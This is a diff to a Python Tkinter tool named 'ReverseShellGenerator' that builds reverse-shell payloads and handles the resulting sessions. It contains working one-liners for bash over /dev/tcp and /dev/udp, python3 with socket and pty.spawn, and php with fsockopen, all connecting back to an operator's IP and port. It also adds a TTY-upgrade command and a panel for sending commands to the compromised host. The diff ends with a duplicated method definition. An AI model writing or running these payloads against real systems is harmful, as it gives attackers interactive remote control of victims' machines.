@@ -11,7 +11,7 @@ from datetime import datetime
 class ReverseShellGenerator: 
     def __init__(self, root):
         self.root = root
-        self.root.title("Reverse Shell generator & Handler")
+        self.root.title("Reverse Shell Handler")
         self.root.geometry("1100x850")
         self.root.configure(bg='#1e1e1e')
         
@@ -113,8 +113,13 @@ class ReverseShellGenerator:
         self.activity_log = scrolledtext.ScrolledText(mid, bg='#1a1a1a', fg='#ffaa00', font=('Arial', 9), width=35)
         self.activity_log.pack(side='right', fill='both')
         
-        self.cmd_entry = tk.Entry(main_frame, bg='#1e1e1e', fg='#00ff00', font=('Consolas', 11), state='disabled')
-        self.cmd_entry.pack(fill='x', pady=10)
+        cmd_frame = tk.Frame(main_frame, bg='#1e1e1e')
+        cmd_frame.pack(fill='x', pady=10)
+        
+        tk.Label(cmd_frame, text="Run command:", bg='#1e1e1e', fg='white', font=('Arial', 10, 'bold')).pack(side='left', padx=(0, 5))
+        
+        self.cmd_entry = tk.Entry(cmd_frame, bg='#1e1e1e', fg='#00ff00', font=('Consolas', 11), state='disabled')
+        self.cmd_entry.pack(side='left', fill='x', expand=True)
         self.cmd_entry.bind('<Return>', lambda e: self.send_command())
         self.cmd_entry.bind('<Up>', self.navigate_history)
 
@@ -123,14 +128,13 @@ class ReverseShellGenerator:
         port = self.port_entry.get().strip()
         sh = self.shell_var.get()
         
-        # --- THE FIX: Sync IP and Port to Listener Tab ---
         self.listen_ip_entry.delete(0, tk.END)
         self.listen_ip_entry.insert(0, ip)
         self.listen_port_entry.delete(0, tk.END)
         self.listen_port_entry.insert(0, port)
         
         payloads = {
-            "bash_tcp": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+            "bash_tcp": f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
             "bash_udp": f"sh -i >& /dev/udp/{ip}/{port} 0>&1",
             "python": f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"{sh}\")'",
             "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{sh} <&3 >&3 2>&3\");'",
@@ -200,28 +204,60 @@ class ReverseShellGenerator:
             "/usr/bin/script -qc /bin/bash /dev/null\n"
         )
         self.client_socket.send(upgrade_cmd.encode())
-        self.log("🚀 Chained TTY upgrade started...")
-
+        self.log("🚀 Shell upgraded")
+   
     def receive_data(self):
         def recv_thread():
             while self.is_connected:
                 try:
                     data = self.client_socket.recv(4096)
                     if not data: break
-                    raw = data.decode('utf-8', errors='replace')
                     
-                    # Clean ANSI and Bracketed Paste Mode (keeps user@host clean)
-                    clean = re.sub(r'\x1b\[\??[0-9;]*[a-zA-Z]', '', raw)
-                    clean = re.sub(r'\x1b\].*?(\x07|\x1b\\)', '', clean)
+                    text = data.decode('utf-8', errors='replace')
                     
-                    self.shell_output.insert(tk.END, clean)
-                    self.shell_output.see(tk.END)
+                    # Remove ANSI color codes: [;94m, [1;31m, etc.
+                    text = re.sub(r'\x1b\[[0-9;]*m', '', text)
+                    
+                    # Remove bracketed paste mode: [?2004h and [?2004l
+                    text = re.sub(r'\x1b\[\?2004[hl]', '', text)
+                    
+                    # Remove terminal title sequences: ]0;...
+                    text = re.sub(r'\x1b\]0;[^\x07]*\x07', '', text)
+                    
+                    # Remove cursor movement: [C
+                    text = re.sub(r'\x1b\[[A-Z]', '', text)
+                    
+                    # Remove carriage returns
+                    text = text.replace('\r', '')
+                    
+                    # **FIX: Remove duplicate prompts on same line**
+                    text = re.sub(r'└─#\s+└─#\s+', '└─# ', text)
+                    
+                    # **FIX: Remove └─# followed by space at end of line (before newline)**
+                    text = re.sub(r'└─#\s+\n', '\n', text)
+                    
+                    # Display cleaned output
+                    if text.strip():
+                        self.shell_output.insert(tk.END, text)
+                        self.shell_output.see(tk.END)
+                    
                 except:
                     break
             self.log("🔌 Connection closed.")
             self.stop_listener()
         threading.Thread(target=recv_thread, daemon=True).start()
-
+        
+    def send_command(self):
+        cmd = self.cmd_entry.get().strip()
+        if not cmd or not self.is_connected: return
+        self.command_history.append(cmd)
+        self.history_index = len(self.command_history)
+        
+        if cmd.lower() in ['clear', 'cls']:
+            self.shell_output.delete(1.0, tk.END)
+        else:
+            self.client_socket.send((cmd + '\n').encode())
+        self.cmd_entry.delete(0, tk.END)
     def send_command(self):
         cmd = self.cmd_entry.get().strip()
         if not cmd or not self.is_connected: return
